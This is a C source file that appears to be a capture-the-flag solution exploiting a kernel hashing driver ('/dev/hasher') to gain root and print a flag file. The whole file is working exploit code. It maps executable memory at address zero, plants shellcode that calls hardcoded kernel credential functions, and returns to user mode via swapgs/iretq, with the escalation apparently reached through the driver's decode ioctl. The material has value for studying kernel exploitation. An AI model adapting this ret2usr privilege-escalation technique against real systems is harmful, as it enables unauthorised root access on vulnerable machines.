#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <assert.h>
#include <string.h>
#include <sys/mman.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

#define HASH_INIT 0xdead0000
#define HASH_ENCODE 0xdead0001
#define HASH_DECODE 0xdead0002
#define HASH_INFO 0xdead0003

#define HASH_BASE64 0xdead1000
#define HASH_MD5 0xdead1001
#define HASH_SHA256 0xdead1002
#define HASH_SHA1 0xdead1003

#define HASH_UNDEFINED 0xdead2000

#define DEV_PATH "/dev/hasher"
//Globals

//leaked canary
unsigned long canary;

//save reisters for iretq return

struct user_req {
	unsigned long len;
	char * in;
	char * out;
};

struct trap_frame {
	void* rip;
uint64_t cs;
	uint64_t rflags;
	void * rsp;
	uint64_t ss;
};
struct trap_frame tf;



//file descriptor for device
unsigned long fd;


void pop_shell() {
	if (getuid() == 0) {
		puts("[!] Got root!");
		int fd = open("/flag", O_RDONLY);
		char buf[0x400];

		read(fd, buf, 0x400);
		printf("%s\n", buf);
	}
	else {
		puts("[!] Failed to get root. Exiting");
		exit(-1); }
}

void save_state() {
	asm(
	"movq %%cs, %0\n"
	"movq %%ss, %1\n"
	"movq %%rsp, %3\n"
	"pushfq\n"
	"popq %2\n"
	: "=r"(tf.cs), "=r"(tf.ss), "=r"(tf.rflags), "=r"(tf.rsp) :: "memory"
	);
	tf.rip = &pop_shell;
	puts("[!]Saved state\n");
}

void open_device() {
	fd = open(DEV_PATH, O_RDONLY);
	if (fd < 0) {
		puts("[!] Failed to open device, exiting\n");
		exit(-1);
	}
	else {
		puts("[!] Opened device succesffuly\n");
	}
}

void escalate_privs() {
	asm(
	"lea 0xffffffff81090850, %rax\n"
	"xor %rdi, %rdi\n"
	"call *%rax\n"
	"mov %rax, %rdi\n"
	"lea 0xffffffff810905b0, %rax\n"
	"call *%rax\n"
	"swapgs\n"
	"mov $tf,%rsp\n"
	"iretq\n"
	);
}

void exploit() {
	ioctl(fd, HASH_INIT, HASH_MD5);

	unsigned long mmap_addr = mmap(0x0, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, -1, 0);
	assert(mmap_addr == 0);

	//length is arbitrarily cjosen, just copy the entire function
	memcpy(mmap_addr, &escalate_privs, 0x400);

	//we dont really need this req structure
	//but its good form to corrupt as little stuff as possible
	char in[0x10];
	char out[0x10];
	struct user_req * req = malloc(sizeof(struct user_req));
	req->in = in;
	req->out = out;
	req->len = 0x10;

	ioctl(fd, HASH_DECODE, req);


}

int main() {
	save_state();

	open_device();

	exploit();


	return 0;
}
